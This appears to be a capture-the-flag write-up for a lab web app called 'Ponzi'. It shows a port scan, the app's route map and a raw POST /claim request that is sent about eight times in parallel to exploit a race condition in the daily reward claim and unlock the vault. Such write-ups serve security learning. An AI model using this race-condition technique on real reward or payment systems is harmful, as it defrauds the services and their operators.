## Description
_Flags have been omitted from this writeup per platform guidelines._

```bash
Ponzi set his towel down for one 24-hour reward claim. He came back to find the sunbed had been "claimed" three times over while he wasn't looking.

Concierge Briefing
Ponzi found the resort's wellness portal running a little side project called Ponzi — a crypto rewards app, poolside edition. He set his towel down, claimed his daily reward, and went to reapply sunscreen. He came back to find the sunbed had been "claimed" three times over while he wasn't looking.

He's convinced the app owes him a spot in the Whale Vault. The app disagrees, politely, once every 24 hours. Somewhere between his request and the server's clock, there's a gap wide enough to walk a whale through.
```
---
🏖️ **TODAY'S ITINERARY**
- [ ] Create a guest account and explore Ponzi's daily reward mechanism.
- [ ] Work out exactly what's standing between you and Whale Vault status.
- [ ] Find your way past it and retrieve the flag from the vault.
----
### IP
```IP
10.48.147.189
```
---
## Enumeration
- Rust-Scan 
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 80:3a:b0:d8:96:02:02:22:30:58:1c:ac:34:f4:2f:73 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPIwNRKSYQck05E5nMNt+xJD3699IkEVziHqC+VGn+x4vd6/LhHJVA7QKHDl90+cN/yn6NFxVE7utyoGiLrWCv4=
|   256 b4:be:dc:7e:a6:b3:5d:30:4c:7b:31:0f:44:31:90:de (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMI4Ri2pN+rFqShg9h1J6rLTlrpCNjYIzyZ5MRfOwekV
3000/tcp open  http    syn-ack ttl 62 Node.js Express framework
| http-title: Ponzi Portfolio \xE2\x80\x94 Login
|_Requested resource was /auth/login
| http-methods:
|_  Supported Methods: GET POST OPTIONS
```
----
### WEB
#### Application Route Map

```text
/
├── auth
│   ├── login
│   │   ├── GET  ?username=&password=
│   │   └── POST {"username":"test1","password":"test1234"}
│   ├── logout
│   │   └── POST
│   └── register
│       ├── GET  ?username=&password=
│       ├── POST {"username":"test1","password":"test1234"}
│       └── POST {"username":"test12","password":"test123"}
├── claim
│   └── POST
├── css
│   └── style.css
├── dashboard
│   └── api
│       └── me
├── js
│   ├── auth.js
│   └── dashboard.js
└── vault
```
---
## Repeater
- Used Repeater and send n8 request together in parallelly
```bash
POST /claim HTTP/1.1 
Host: 10.48.147.189:3000 
Content-Length: 0 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Accept: */* 
Sec-GPC: 1 
Accept-Language: en-US,en;q=0.5 
Origin: http://10.48.147.189:3000 
Referer: http://10.48.147.189:3000/dashboard 
Accept-Encoding: gzip, deflate, br 
Cookie: connect.sid=s%3AzZll_jxm_uPZ8mxs3uWt3bPpo_b51xoN.fsWQZ5YD07zWgZVUIs3N6yHlZ1ehKkZSRZSGO9UrBFQ 
Connection: keep-alive
```
- Send All Together 
- Open Vault 
```Flag
[flag omitted]
```
# END